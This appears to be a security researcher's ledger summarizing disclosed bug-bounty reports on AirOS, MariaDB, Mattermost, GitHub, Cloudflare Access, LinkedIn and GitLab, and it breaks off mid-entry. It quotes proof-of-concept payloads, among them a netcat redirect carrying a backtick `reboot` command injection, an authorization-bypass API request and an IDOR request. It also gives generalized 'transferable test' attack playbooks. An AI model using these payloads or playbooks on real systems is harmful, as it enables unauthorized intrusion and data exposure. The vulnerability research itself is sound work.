SOURCE: https://hackerone.com/reports/139398  2026-11-12
ROUTE: live H1 `web_extract` returned the report body with code blocks elided -> `r.jina.ai` rendered the full body including the code blocks (the route that worked). Ubiquiti Inc., "Read-Only user can execute arbitraty shell commands on AirOS", reporter rbran, submitted May 17, 2016, disclosed August 5, 2016, Resolved, weakness Command Injection - Generic, no severity rating; third of the series #119317 -> #128750 -> #139398 (each fix bypassed).
STATUS: UNVERIFIED (not reproduced — no AirOS device in the lab this pass).
CLASS: command execution / RCE (privilege escalation: read-only user -> arbitrary shell commands on the device) — a REMOTE RESPONSE (the feature's own fetch redirect target) is validated only by a SUBSTRING regex and then interpolated UNQUOTED into a shell command.
CORE METHOD:
  1. THE ENTRY POINT (a read-only session suffices): trigger the device's remote speed-test fetch against the attacker host — web UI https://<device>/sptest.cgi or: curl 'https://192.168.1.20/sptest_action.cgi?ticket=507&action=remote&target=192.168.1.100&port=8080&login=ignore&passwd=ignore&airosid=96ba18a3aa55ba4c6e1f8ab111a9fb8f&_=1463505340471' -H 'Cookie: AIROS_001122334455=96ba18a3aa55ba4c6e1f8ab111a9fb8f; ui_language=en_US; last_check=1463504970136'
  2. THE ATTACKER SERVER answers the fetch with a redirect whose target carries shell code AFTER the required substring (reporter's verbatim PoC):
     echo -en "HTTP/1.1 302 Found\r\nLocation: https://192.168.1.100/login.cgi `reboot`\r\nContent-Length: 0\r\n\r\n" | ncat -lp 8080
  3. THE ROOT CAUSE, verbatim: the vulnerability "resides in the function `fetchCookies` file `remote.inc:117` ... is a non sanitization or verification of the server (remote) response". On `res == -11` (redirect) the code takes `$new_url = $lines[$lcount - 1]` ("the URL returned by the attacker have shell code injected") and validates it with `$rg_login = "(https?://$ip(:[[:digit:]]+)?)/login.cgi"` — the report's own code comment: "regex don't property verify the URL, it allow string before and after the URL". `ereg($rg_login, $new_url, $regs)` therefore PASSES for `https://192.168.1.100/login.cgi` + backtick-quoted command, and `$url = $new_url` ("URL with shell code is utilized").
  4. THE SINK, verbatim: `$full_cmd = "$cmd_trigger -p $url"; # URL with shell code is injected` then `exec($full_cmd, $lines, $res); # shell code executed`.
  5. THE FIX CONFIRMS THE CLASS, verbatim: "This bug can be solved using literally 2 character, the REGEX end `$` and begin `^`: `$rg_login = "^(https?://$ip(:[[:digit:]]+)?)/login.cgi$";`" — the entire bypass is the missing anchors.
DETECTION SIGNAL: a device/service feature that FETCHES a user-supplied URL and consumes the RESPONSE (302/3xx Location, last response line, echoed value) in a shell command (`exec`/`system`/`popen`/command string); a validation regex written WITHOUT `^`/`$` anchors (substring semantics — `ereg`/unanchored `preg_match`, `indexOf`/`contains`-style checks); backticks/`$()`/`;` surviving inside the "validated" value; a low-privilege role able to trigger the fetch (read-only user, guest, "test"/"speed test"/"check" buttons).
CHAIN: read-only user session (primitive: lowest-privilege trigger of the device's outbound fetch) -> attacker host answers with a redirect whose target is <required substring> + shell metacharacters (primitive: attacker-controlled remote response) -> unanchored regex passes because "it allow string before and after the URL" (bypass) -> `$url` interpolated unquoted into `$cmd_trigger -p $url` and `exec`ed (escalation: command execution) -> arbitrary shell commands as the service user on the router (impact: read-only -> RCE; the class survived two prior fixes — #119317, #128750).
TRANSFERABLE TEST: on any feature that fetches a URL and feeds the response into a command/parse step (speed tests, webhook "test" buttons, update checks, link unfurl, import-from-URL): (1) point it at your listener and answer with a 302 whose Location is <exactly-what-the-validator-looks-for> followed by a backtick-quoted `id` (and `$(id)` / `;id;` variants — appended AND prepended around the required substring); (2) confirm the app's URL check is substring-only by appending bytes AFTER the pattern (and prepending before it); (3) if the value reaches `exec` unquoted, the marker command runs with the service's privileges — read it back via the feature's own output/log. Rule: **a validation regex without anchors matches a substring, not a string — when the validated value is a REMOTE response interpolated into a shell command, everything appended after the matched substring executes; the fix is two characters, so this class recurs wherever a fetch response is validated "loosely" and used "literally".**
DEDUPE/DELTA: `139398`, `rbran`, `fetchCookies`, `remote.inc`, `sptest_action`, `cmd_trigger`, `AirOS`, `XM.v6.0-beta9`, `128750`, `119317` = 0 hits across all three write targets. Related-but-distinct REVIEWED and NOT re-recorded: §17.483 (Basecamp Electron — unanchored HOST regex as a download gate; the anchor bypass is recorded there as a sub-technique, but the sink is client-side download-and-auto-open, not a server-side `exec` fed by the fetched response), §17.542 (right-unanchored sandbox regex -> privileged file ops), §17.581 / ledger 17006 (embed the allowed substring/domain inside an attacker URL — allowlist confusion, no shell sink), V-07 (argument injection into wrapper argv — word-splitting/argv boundaries, not regex-anchor bypass of a remote-response validator). NEW DELTA: (a) the injected string is the REMOTE RESPONSE of the feature's own fetch (302 Location / last line), (b) unanchored-regex bypass + unquoted `exec()` interpolation in ONE string (validate-by-substring, use-as-whole), (c) read-only -> device RCE with a two-fix bypass series behind it. NEW general method -> §17.590.
FRESHNESS: submitted 2016-05-17 / disclosed 2016-08-05 — outside the preferred 6-12 month window; read because assigned.

SOURCE: https://hackerone.com/reports/3897914  2026-11-12
ROUTE: live H1 `web_extract` served the full report body (summary, code excerpt, prerequisites, security boundary, affected versions, repro transcript, triage) in one pass. MariaDB, "Out-of-bounds read in MariaDB .frm parsing enables RCE via vtable hijacking", reporter pinebudweiser, submitted July 29, 2026, disclosed September 8, 2026, Resolved, Severity High (8.8), weakness Out-of-bounds Read, CVE-2026-107821 (MDEV-40571).
STATUS: UNVERIFIED (not reproduced — no MariaDB build/exploit stood up this pass; the report ships attached PoC videos + `13.1.0_poc.7z` and a repro transcript).
CLASS: memory corruption -> RCE via insecure metadata-file parsing, plus privilege escalation (FILE privilege -> native code execution in the `mariadbd` context).
CORE METHOD:
  1. THE ROOT CAUSE, verbatim: "MariaDB does not validate the upper bound of the attacker-controlled `key_part->fieldnr` value parsed from a crafted `.frm` file before using it as an index into the `share->field[]` array. The code only verifies that `fieldnr` is not zero. It does not verify that `fieldnr` is less than or equal to `share->fields`." This results in "an intra-allocation out-of-bounds read of a `Field*` pointer".
  2. THE PLACEMENT (why no heap spray is needed), verbatim: "Because `share->field` and `comment_pos` are placed in the same `multi_alloc_root` allocation, an attacker can select an out-of-range `fieldnr` whose calculated array slot overlaps attacker-controlled data stored at `comment_pos`." The comment field is attacker-controlled `.frm` bytes = a ready-made fake object at a predictable slot.
  3. THE HIJACK, verbatim: "The attacker-controlled value is subsequently interpreted as a valid `Field*`. MariaDB then performs a C++ virtual method call through this pointer" -> "supply a forged C++ object and fake vtable. The virtual call dereferences the attacker-controlled vtable and results in control-flow hijacking" -> "arbitrary code execution in the security context of the MariaDB server process" (reporter's transcript: `fieldnr = 47` "delivering weapon, triggering R5 (execve)").
  4. THE DELIVERY (no OS shell / no direct filesystem access), verbatim: "The crafted `.frm` file is delivered through the SQL interface using the `FILE` privilege"; the remote chain, verbatim: "1. DROP TABLE removes the existing table and .frm file. 2. SELECT UNHEX(...) INTO DUMPFILE writes the crafted .frm file. 3. FLUSH TABLES invalidates the relevant table cache. 4. SHOW CREATE TABLE causes MariaDB to load and parse the crafted .frm file." Required: global `FILE` + `RELOAD` + CREATE/DROP/SELECT/INSERT on a schema — "`SUPER` and operating-system-level access are not required."
  5. THE SECURITY BOUNDARY, verbatim: "This vulnerability converts the ability to create a data or metadata file inside the MariaDB data directory into arbitrary code execution inside the MariaDB server process. Therefore, the impact exceeds the intended capabilities of the `FILE` privilege." (Caveat, verbatim: it "does not inherently provide root privileges ... limited by the privileges of the `mariadbd` account" plus SELinux/AppArmor/containers.)
DETECTION SIGNAL: a parser (DB metadata, OOXML/office, archive, font, image, game asset) that reads an index/count field from the file and checks only `!= 0`/sign, never `< array-length`; a custom arena/region allocator (`multi_alloc_root`, region allocators) placing a pointer TABLE and an attacker-controlled string/blob (comment, name, metadata) in the SAME allocation; C++ virtual calls on objects resolved through that index; on the SQL side: any account with `FILE`/`DUMPFILE`-equivalent write into the parser's input directory plus a parse trigger (cache flush + metadata read).
CHAIN: DB account with `FILE`+`RELOAD` and ordinary DDL/DML (primitive: write arbitrary bytes into the datadir — normally rated "just file write") -> `SELECT UNHEX(...) INTO DUMPFILE` writes a crafted `.frm` whose out-of-range `fieldnr` indexes past `share->field[]` onto the `comment_pos` bytes of the same `multi_alloc_root` allocation (primitive: unchecked index + intra-allocation overlap -> attacker-controlled `Field*`) -> `FLUSH TABLES` + `SHOW CREATE TABLE` forces the parse (trigger) -> virtual call through the forged object's fake vtable -> arbitrary native code as the `mariadbd` OS account (impact: FILE privilege -> RCE; "exceeds the intended capabilities of the FILE privilege").
TRANSFERABLE TEST: with only a DB FILE-equivalent (or any write into a parser's input dir) plus a trigger: (1) write crafted metadata through the DB's own dump feature (`SELECT UNHEX(<craft>) INTO DUMPFILE '<datadir>/<name>.frm'`), invalidate caches (`FLUSH TABLES`) and force the parse (`SHOW CREATE TABLE` / reopen the object); (2) set the file's index field past the array end, COMPUTED to land inside the same allocation's attacker-controlled region (comment/name/metadata string) — map the layout first (array + strings in one arena); (3) run under a debugger: if the vtable pointer equals bytes you control, shape the fake object/vtable and pivot (the report's `t16_e2e.py` does leak `comment_pos` -> CALIB re-leak -> `--fire`). The tell everywhere: an index "checked for zero" is not bounds-checked. Rule: **"not zero" is not a bound — when a file-supplied index lands on file-supplied bytes in the same allocation, the object is yours; and a metadata-file write primitive plus a parse trigger escalates "file write" into native code execution.**
DEDUPE/DELTA: `3897914`, `fieldnr`, `comment_pos`, `multi_alloc_root`, `.frm`, `MDEV-40571`, `CVE-2026-107821`, `pinebudweiser` = 0 hits across all three write targets. Related-but-distinct REVIEWED and NOT re-recorded: the CS:GO OOB->vtable entries (ledger ~3000–3258: `ent_index`/`slot` index with no checks into a GLOBAL array, negative-wrap resolution, convar staging / heap spray for the fake object, ROP) — same terminal class (OOB read -> fake vtable -> virtual call hijack) but a different primitive (global-array wrap + staging vs intra-allocation overlap in one `multi_alloc_root`), different carrier (network message vs metadata file) and different escalation (unauth game client vs FILE-privilege -> `mariadbd` RCE); the `INTO DUMPFILE` material (ledger 16929–16934) records DUMPFILE as a web-shell FILE WRITE chained to a delete — a web-RCE carrier, not a parser-memory-corruption delivery. NEW DELTA: (a) `FILE` privilege as a PARSER-RCE primitive (crafted metadata into the datadir + parse trigger), (b) index checked `!= 0` but never `< fields`, (c) pointer array + attacker comment string in ONE allocation = spray-free fake-object placement. NEW general method -> §17.591.
FRESHNESS: submitted 2026-07-29 / disclosed 2026-09-08 — INSIDE the preferred 6-12 month window.

SOURCE: https://hackerone.com/reports/1851818  2026-11-12
ROUTE: full body read from BOTH the live H1 `web_extract` (code block inline) and the HuggingFace `Hacker0x01/hackerone_disclosed_reports` parquet (`vulnerability_information`, validation split) — they agree verbatim. Mattermost, "Member role which doesn't have permission to send message can send by executing channel commands", reporter ramsakal7582, submitted 2023-01-30, disclosed 2024-05-08, Resolved, weakness Improper Access Control - Generic, triaged valid + bounty + swag (triage, verbatim: "we have determined that it is a valid issue").
STATUS: UNVERIFIED (not reproduced — no Mattermost instance stood up in the lab this pass).
CLASS: BAC / authorization bypass on a WRITE ACTION — a channel-level SEND-MESSAGE permission is enforced on the message-create endpoint but not on the slash-command execution path, whose side effect posts content into the caller-supplied channel as the command/bot identity.
CORE METHOD:
  1. THE PRIMITIVE, verbatim: "Someone with a member permission who hasn't been given access to post message to the channel can post it by executing commands." The normal message-create path for the channel is denied to the caller's role; the goal is an arbitrary message in that channel.
  2. THE BYPASS REQUEST, the reporter's verbatim PoC (session cookie + `X-Requested-With: XMLHttpRequest` + `X-CSRF-Token`):
     POST /api/v4/commands/execute HTTP/1.1
     Host: test3.cloud.mattermost.com
     Content-Type: application/json
     Origin: https://test3.cloud.mattermost.com

     {"command":"/echo ami","channel_id":"khhnkrf5wf8yibwx8bd14s6fbw","team_id":"8jdphis493d4pbq3u1bagz643r"}
  3. THE MECHANISM, verbatim: "Executing above command will post the message to the given channelID and TeamID when you try to reproduce it with your cookie." `/echo <text>` is a command whose behavior is to post `<text>` — so the ATTACKER CHOOSES the message content (`ami`) — and the post lands in the supplied `channel_id` although the caller's own send-message permission there is denied.
  4. IMPACT, verbatim: "Someone who doesn't have permission to post message to the channel can still post it by executing channel commands." (The permission model is enforced only on the message-create endpoint; the command executor posts as the command identity and never consults the caller's channel send permission.)
DETECTION SIGNAL: a chat/collab platform whose channel permissions distinguish "is a member" from "can post" (restricted / announcement / moderated channels) AND a command/automation endpoint (`/api/v4/commands/execute`, slash-command runners, bot triggers, workflows, incoming webhooks) that accepts a caller-supplied target channel identifier and creates content there as a side effect; the tell is a message appearing from the command/bot identity in a channel where the caller's own post attempt was rejected.
CHAIN: member role without post permission in a restricted channel (primitive: a denied write) -> `POST /api/v4/commands/execute` with `{"command":"/echo <attacker text>","channel_id":"<restricted channel>","team_id":"<team>"}` (bypass: the command path creates the message as the command identity and never applies the channel's send-message permission to the caller) -> attacker-controlled message content appears in the restricted channel (impact: authorization-gated write bypassed — content injection into announcement/moderated channels users trust, phishing from a trusted channel; H1 triaged valid with bounty; doctrine §6 "BAC ... on ... write actions" = P2/High where the channel is sensitive).
TRANSFERABLE TEST: on any chat/collab product with channel-level send permissions (Mattermost, Slack/Discord/Teams-style clones, Zulip, Nextcloud Talk, support inboxes): (1) as a member WITHOUT post rights in channel X, confirm the normal message-create call is denied; (2) enumerate every content-creating SIDE PATH — slash-command execution (`/api/v4/commands/execute`, `/commands/execute`), bot commands, /me, /poll, /echo-class commands, scheduled messages, workflow/automation runners, incoming webhooks — and point each target identifier (channel_id/team_id/conversation_id) at X; (3) if the command's output or your argument text lands as a message in X, the permission model is enforced on the message-create endpoint ONLY. Rule: **every feature that creates a message as a side effect must re-check the caller's send-message permission for the target channel — command execution posts as the command identity, so the gate is silently skipped.**
DEDUPE/DELTA: `1851818`, `ramsakal7582`, `commands/execute`, `/echo ami`, `khhnkrf5wf8yibwx8bd14s6fbw`, `test3.cloud.mattermost.com` = 0 hits across the three write targets (the only `commands/execute`-adjacent material is the Slack slash-command SSRF stub #356765 recorded under VALID-BUT-NOT-APPENDED — a no-content stub about SSRF in slash commands, not a permission bypass). Related-but-distinct REVIEWED and NOT re-recorded: §17.348 (Nextcloud TaskProcessing callback — a bot posting with a trusted service identity into a caller-supplied conversation without re-checking CURRENT MEMBERSHIP; SAME "service-identity second authorization surface" family — this entry is the variant where the caller is a CURRENT member lacking the channel SEND permission and the write path is slash-command execution); §17.345 (Rocket.Chat — REST fix not reaching the DDP twin; a missed check on the SAME operation on a sibling plane, not a different-operation side effect); §17.565 (create-vs-edit permission asymmetry on an object flag). NEW DELTA: the write path is a FEATURE SIDE EFFECT (command execution) that creates content as the command/bot identity, and the un-enforced permission is the container's CONTENT-SEND permission (not membership, not the same operation elsewhere). Because the GENERAL method (trusted-service-identity second authorization surface) is already recorded as §17.348, this specific mechanism is admitted to the ledger as a distinct variant and does NOT open its own §17 general-method slot.
FRESHNESS: submitted 2023-01-30 / disclosed 2024-05-08 — outside the preferred 6-12 month window; read because assigned.

SOURCE: https://hackerone.com/reports/1831528  2026-11-12
ROUTE: the reporter body is NOT public (`visibility: no-content`; `vulnerability_information` 0 B both in the local HuggingFace `Hacker0x01/hackerone_disclosed_reports` parquet and on the live `https://hackerone.com/reports/1831528.json` route; the `.json` `summaries` array holds only GitHub's own summary plus an empty slot; the `r.jina.ai` page render shows "Summary by GitHub" + timeline and NO researcher summary). The technique below is built from GitHub's OWN summary + the CVE advisory, read this pass and agreeing verbatim: GitHub Advisory GHSA-jv37-6f69-j8gw / CVE-2023-23762 (NVD: CWE-697 Incorrect Comparison, CVSS 3.1 5.3 AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N) and the GHES 3.4.18 release-notes entry. Sibling reports by the same reporter on the same family — #2017600 "Git Reference Ambiguity in GitHub - Commit Smuggling, Account Takeover, and Remote Code Execution" (disclosed 2023-11-29) and #1938106 "Smuggling content in PR with refs/replace in GitHub" (2023-08-01) — are ALSO `no-content` (checked in the same dataset). Web search surfaced only listing pages and the advisory — NO credited public writeup exists. HONESTY: the exact branch-name ambiguity form and the exact comparison bug are not public anywhere; the single non-report fact used below (git ref-collision behavior) is labeled where it appears and was verified locally against git 2.43.0, not against GHES. Metadata: GitHub, "Rogue collaborators and ambiguous branch names in GitHub", weakness Business Logic Errors, reporter inspector-ambitious, submitted 2023-01-11, disclosed 2023-12-05, 43 votes, no H1 severity rating.
STATUS: UNVERIFIED (not reproduced — no GHES instance; the report body is withheld on every route).
CLASS: business logic / code-review integrity (CWE-697 Incorrect Comparison) — commit smuggling: a collaborator's ambiguous branch name makes GitHub display an incorrect diff, so the diff the maintainer reviews is not what the merge brings in.
CORE METHOD:
  1. PRECONDITIONS, verbatim (GitHub summary = CVE-2023-23762 text): "an attacker would need write access to the repository and be able to correctly guess the target branch before it's created by the code maintainer". NVD rates the outcome I:H (integrity high) with PR:L and AC:H.
  2. THE SETUP (title + summary): a "rogue collaborator" predicts the branch name the maintainer will create for the upcoming change and CREATES a branch first, in an "ambiguous branch-name form" (the title's phrase; the exact form is not public).
  3. THE BUG, verbatim: "An incorrect comparison vulnerability ... that allowed commit smuggling by displaying an incorrect diff" — the branch-name comparison resolves to the wrong ref, so the review UI shows a diff that does not correspond to the merge result.
  4. THE PAYOFF: the maintainer reviews and merges the displayed diff while the attacker's unreviewed commits land in the target branch = "commit smuggling". Affected: all GHES < 3.9; fixed in 3.4.18 / 3.5.15 / 3.6.11 / 3.7.8 / 3.8.1.
  5. INDEPENDENTLY VERIFIED (NOT from the report): git's ref namespace cannot hold `refs/heads/x` and `refs/heads/x/y` simultaneously — creating either while the other exists fails "fatal: cannot lock ref 'refs/heads/x': 'refs/heads/x/y' exists" (verified locally, git 2.43.0, both creation orders). This is the canonical colliding/ambiguous ref-name pair and the natural probe family; the report does not say which form triggers its bug.
DETECTION SIGNAL: a code-review platform whose PR/merge DIFF is computed through a branch-name comparison instead of resolved ref ids; branch names that can collide with a FUTURE branch name (`x` vs `x/y`; case-folded pairs on case-insensitive backends; trailing `.lock`/`~`/`^` suffixes); a displayed diff that can be made to disagree with `git diff merge-base..head`. TELL = the web UI's diff != the merged tree's diff.
CHAIN: write-access collaborator (P4 primitive: an already-trusted-but-rogue insider) -> predicts the name of a branch the maintainer will create -> pre-creates the colliding/ambiguous branch name (primitive: the ref-namespace collision) -> the incorrect name comparison makes the platform display an incorrect diff (bypass) -> the maintainer approves the wrong diff and merges -> unreviewed attacker commits enter the protected branch (impact: code-review integrity defeated = commit smuggling -> supply-chain escalation: malicious code reaching builds/releases; the same reporter's sibling #2017600 title shows the family reaches "Account Takeover, and Remote Code Execution" — sibling context only, its body is also withheld).
TRANSFERABLE TEST: on any git hosting/code-review platform (GHES, GitLab, Gitea, Gogs, Bitbucket): (1) as a collaborator with write access, predict the target branch name of an upcoming change and pre-create a colliding name first — probe the ref-collision family (`x` vs `x/y`, both creation orders; case variants; trailing-suffix forms) on the platform's ref backend; (2) open/refresh the PR through the platform UI; (3) diff byte-for-byte what the UI displays against `git diff <merge-base>..<head>` (or merge into a scratch branch and compare trees); (4) any divergence = commit smuggling — the review shown was not the merge made. Rule: **the reviewed diff must BE the merged diff — a name comparison that can resolve to a different ref than the name given smuggles commits past review; run the diff-view == merge-result check on every platform where collaborators can pre-create branch names.**
DEDUPE/DELTA: `1831528`, `CVE-2023-23762`, `GHSA-jv37-6f69-j8gw`, `commit smuggling`, `refs/replace`, `ref ambiguity` = 0 hits for this technique across the three write targets (the 220 bare-`smuggl` hits are HTTP request smuggling/desync — a different class). Related-but-distinct REVIEWED and NOT re-recorded: #2357443/#2216036 (inspector-ambitious, GHES `updateTeamsRepository` TOCTOU — a cross-API-surface permission race, §17.467); nothing in the ledger records review-diff confusion via branch-name collisions. NEW DELTA: the whole class (pre-create a predicted branch name in a colliding form -> incorrect diff -> unreviewed commits merged). New general method -> §17.593.
FRESHNESS: submitted 2023-01-11 / disclosed 2023-12-05 (CVE published 2023-04-07) — outside the preferred 6-12 month window; read because assigned.

SOURCE: https://hackerone.com/reports/2122690  2026-11-12
ROUTE: reporter body `visibility: no-content` (`vulnerability_information` 0 B in the local HuggingFace parquet and on the live `.json` route; the timeline carries only status changes). The technique is Cloudflare's OWN team summary, read from the live `.json` `summaries` field AND the `r.jina.ai` page render ("Summary by Cloudflare Public Bug Bounty") — the route that worked. Metadata: Cloudflare Public Bug Bounty, "Accessing apps protected via ZT's Access when user account is deleted/disabled even after clearing user session/seat", weakness Improper Authentication - Generic, severity High (8.4; opened at critical 9.9, moved 8.5 -> 8.4), bounty + completed retest, reporter matured_kazama, submitted 2023-08-24, disclosed 2023-10-25, asset "Cloudflare Access" (OTHER).
STATUS: UNVERIFIED (not reproduced — no Zero Trust org stood up this pass; every quote is Cloudflare's own summary).
CLASS: authentication bypass in a ZT gateway's session validation — a deprovisioned identity keeps access to Access-protected SaaS apps through preserved Access-JWT metadata plus a second active account in the same organisation, because the gateway does not re-validate identity checks server-side.
CORE METHOD:
  1. THE MECHANIC, verbatim (Cloudflare summary): "When a user account is deleted/disabled at IdP level (for example, when an employee leaves the company), if that user a) preserved some metadata of his Access JWT and b) had access to another active user account (that may or may not have access to any apps) inside the same organisation, due to lack of server-side validation of certain checks, this user would have been able to access SaaS apps despite not being privileged enough to do so."
  2. THE THREE INGREDIENTS (all named by the summary): (a) the identity is deleted/disabled at the IdP — the report title adds this holds "even after clearing user session/seat"; (b) "preserved some metadata of his Access JWT" (the exact fields are NOT public); (c) a second ACTIVE user account inside the same organisation (which may or may not have app access).
  3. THE BYPASS, verbatim: "due to lack of server-side validation of certain checks" — the gateway accepts the preserved token material in combination with the surviving in-org account instead of re-checking, server-side, that the identity still exists and is still privileged.
  4. THE FIX, verbatim: "Cloudflare's Engineering team resolved the issue by implementing the necessary server-side validation checks."
  5. THE VENDOR'S OWN CAVEAT, verbatim: "given the exploitability requirements, the likelihood of this attack was considered low."
DETECTION SIGNAL: a ZT/SSO gateway (Cloudflare Access, Zscaler Private Access, Okta, Azure AD app proxy, Teleport) whose token validation trusts the token's own claims without re-checking the identity's CURRENT status at request time; deprovision flows that revoke sessions/remove seats but leave previously issued token material usable; orgs where members hold multiple accounts — a surviving account can carry preserved claims. TELL: access continues past the documented revocation window (Cloudflare's own revoke flow promises "all previously issued tokens will stop being accepted in 20-30 seconds") when the request combines preserved token material with an in-org identity.
CHAIN: org member holding a second active account in the same organisation (primitive) -> the primary identity is deleted/disabled at the IdP and its session/seat is cleared (revocation event) -> the preserved Access-JWT metadata + the second account are presented to the protected app -> "lack of server-side validation of certain checks" (bypass) -> SaaS apps behind ZT Access remain accessible to a deprovisioned identity (impact: authentication bypass of the zero-trust layer — the enforcement point that is supposed to make deletion/disabling meaningful does not enforce it; High 8.4; vendor-rated low likelihood given the exploitability requirements). Per doctrine §8: preconditions = prior org access + a second in-org account + preserved JWT metadata captured before deprovisioning; gain = continued access to the org's SaaS apps after deletion/disabling.
TRANSFERABLE TEST: on any ZT/SSO-gated app: (1) as identity A, authenticate and preserve EVERY token artifact (CF_Authorization / CF_Session cookies, the Access JWT and its claim metadata, device-posture ids, global-vs-app session cookies); (2) keep/create a second active account B in the same org; (3) deprovision A exactly as the product documents (disable at the IdP, revoke sessions, remove the seat); (4) replay A's preserved material alone and then in combination with B's session against every protected app; (5) any access beyond the documented revocation window = the validation layer trusts preserved claims instead of current identity state. Rule: **deprovisioning is only real when token validation re-checks identity status server-side at request time — preserved token metadata plus any surviving in-org identity is a complete bypass of "we cleared their sessions".**
DEDUPE/DELTA: `2122690`, `matured_kazama` (as this report), `Access JWT`, `clearing user session/seat` = 0 hits for this technique across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: #386997 (revocation applied to the UI layer, never re-checked on the object's read path — a per-object read gap, not gateway token validation); §17.588 (Shopify `path_hmac` — a capability URL surviving staff removal); #1547684 (unlinking a login provider does not revoke its sessions); the CRLF->smuggling entries that BYPASS Cloudflare Access as a product (ledger ~3405/4645 — an edge-parser attack, not a session-validation flaw inside Access); the other matured_kazama entries (§17.389 Access SAML `javascript:` ACS self-XSS; #3424998 OAuth-callback XSS; #3316910) are different surfaces. NEW DELTA: the COMPOSITION attack — preserved JWT metadata + a second in-org identity defeats ZT deprovisioning when identity checks are not re-validated server-side. New general method -> §17.592.
FRESHNESS: submitted 2023-08-24 / disclosed 2023-10-25 — outside the preferred 6-12 month window; read because assigned.

SOURCE: https://hackerone.com/reports/1837309  2026-11-12
ROUTE: dataset + live `.json` report `visibility: no-content` (`vulnerability_information` 0 B), but the researcher's own summary INCLUDING the full vulnerable request survives in the `.json` `summaries` field and in the `r.jina.ai` page render ("Summary by marvelmaniac" + the 662-Byte code block) — that route worked; the request below is quoted verbatim from it. Metadata: LinkedIn, "Anyone can view the results of linkedin skill test -if failed to earn a badge or if the badge earned is kept private: both cases results can be viewed", weakness Insecure Direct Object Reference (IDOR), severity Medium (5.3), bounty, reporter marvelmaniac, submitted 2023-01-17, triaged 2023-01-25, resolved 2023-05-15, disclosed 2023-05-17.
STATUS: UNVERIFIED (not reproduced — no LinkedIn account was touched; the request is the reporter's verbatim PoC).
CLASS: IDOR / broken authorization on a results-READ endpoint (CWE-639) — privacy-promised data (failed assessments, passed-but-private badges) is served to any caller through an object key assembled from PUBLIC identifiers.
CORE METHOD (verbatim):
  1. THE FINDING, verbatim (researcher summary): "It was possible to view the private skill test results of users who failed to earn a badge and also test results of a passed skill test kept private. Here is the request that was vulnerable to IDOR -"
  2. THE REQUEST, verbatim: `GET /voyager/api/voyagerAssessmentsDashSkillAssessmentAttemptReports/urn:li:fsd_skillAssessmentAttemptReport:(urn:li:fsd_profile:<fsd_profile-ID>,urn:li:skill:<SKILL-TEST-ID>,1) HTTP/1.1` with `Host: www.linkedin.com`, `Accept: application/vnd.linkedin.normalized+json+2.1`, `csrf-token: <CSRF-TOKEN>`, `Origin: https://www.linkedin.com`, `Referer: https://www.linkedin.com/skill-assessments/hub/reports/?resultType=`, `Cookie: <COOKIES>`.
  3. THE KEY, verbatim: "The `fsd_profile` ID and the `skill` ID both are public." — the composite object key `urn:li:fsd_skillAssessmentAttemptReport:(urn:li:fsd_profile:<public>,urn:li:skill:<public>,1)` is fully computable from public data (profile URN + skill/taxonomy URN + a trailing literal/ordinal `1`); nothing secret has to be guessed.
  4. THE MISSING CHECKS: neither ownership nor privacy state is consulted — the product promises these results are private (LinkedIn help: "Recruiters won't be able to see your score"; badges can be kept private; failed attempts earn no badge), yet the direct API read returns them for any key the caller assembles.
DETECTION SIGNAL: results/report/attempt/certificate read endpoints whose object key is a composite URN/id of PUBLIC components (profile id + taxonomy id + ordinal); a privacy promise ("private", "hidden", "only you") enforced in the display layer while the API honors only the key; internal frontend APIs (`/voyager/`, `*Dash*` resolver routes) reachable with any user session + CSRF token.
CHAIN: any authenticated user (primitive) -> assembles the composite URN from the victim's PUBLIC `fsd_profile` id + the PUBLIC `skill` id (primitive: the key needs no guessing; both components come from public pages) -> GETs the attempt-report endpoint with their own session (no ownership check) -> reads the victim's skill-assessment results that the product promises to keep private — failed attempts and passed-but-private badges (impact: cross-user privacy-data read; Medium 5.3; the chain stops at privacy disclosure — no ATO or monetary leg is documented in the report).
TRANSFERABLE TEST: on any assessment/badge/certification/achievement feature that promises private results: (1) capture the app's own results-fetch request and split the object key into its components; (2) mark which components are PUBLIC (profile URNs, skill/taxonomy ids, ordinals) and rebuild a victim's key purely from public data; (3) replay with any authenticated session + valid CSRF; (4) cover both hidden states the product promises (failed, kept-private) and diff against the UI; (5) walk the trailing ordinal (`1`, `2`, ...) to enumerate attempts. A response carrying the private result = the privacy promise is display-layer only. Rule: **an object key assembled from public identifiers is not an access control — where a product promises a result is private, the API read must check ownership AND privacy state, not just resolve the key.**
DEDUPE/DELTA: `1837309`, `marvelmaniac`, `voyagerAssessmentsDashSkillAssessmentAttemptReports`, `fsd_skillAssessmentAttemptReport`, `skillAssessment` = 0 hits across the three write targets. Related-but-distinct REVIEWED and NOT re-recorded: §17.312 (LinkedIn voyager `decoration` URN resolution — a stored-URN resolution primitive, not an id-swap read); §17.313 ("the UI's ACL filter is not the object's ACL" — carries the privacy-flag/display-layer aspect); the generic IDOR id-swap family (the swap itself is recorded, incl. "replay every write verb against foreign ids"). NEW DELTA: the object key is FULLY COMPUTABLE FROM PUBLIC INPUTS (the "unguessable id" assumption fails by construction) and the object is privacy-promised data with zero ownership checking. Ledger entry only — no §17 slot (carrier delta of the recorded IDOR + §17.313 families).
FRESHNESS: submitted 2023-01-17 / disclosed 2023-05-17 — outside the preferred 6-12 month window; read because assigned.

SOURCE: https://hackerone.com/reports/1579645  2026-11-12
ROUTE: the live `.json` route (HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL) and the live page via `web_extract` — both carried the complete reporter body; the payload code blocks below are verbatim from the `.json` `vulnerability_information`. Metadata: GitLab, "XSS: `v-safe-html` is not safe enough", weakness Cross-site Scripting (XSS), severity medium (4.4), bounty, reporter yvvdwf, submitted 2022-05-24, disclosed 2022-11-16, state Closed/Resolved; asset gitlab.com (self-managed instances also affected per the CSP note).
STATUS: UNVERIFIED (not reproduced — no GitLab instance was stood up this pass; every quote is the reporter's verbatim PoC).
CLASS: stored XSS (CWE-79) — a frontend sanitizer directive (`v-safe-html`) whose DOMPurify config strips a LIST of framework `data-*` attributes but misses ONE rails-ujs attribute (`data-disable-with`) that renders HTML on click; chained with a CSP pivot: under `script-src 'strict-dynamic'` the same injection degrades to a one-click FORM CSRF that reaches admin privilege escalation.
CORE METHOD:
  1. THE GAP, verbatim: "`v-safe-html` directive uses Dompurify to remove `data-remote', 'data-url', 'data-type', 'data-method'` attributes from HTML tags. Rails-js relies on another attribute, `data-disable-with` to show a HTML content when an user clicks on a disabled link." — the strip LIST covers the AJAX attributes but not the HTML-rendering one.
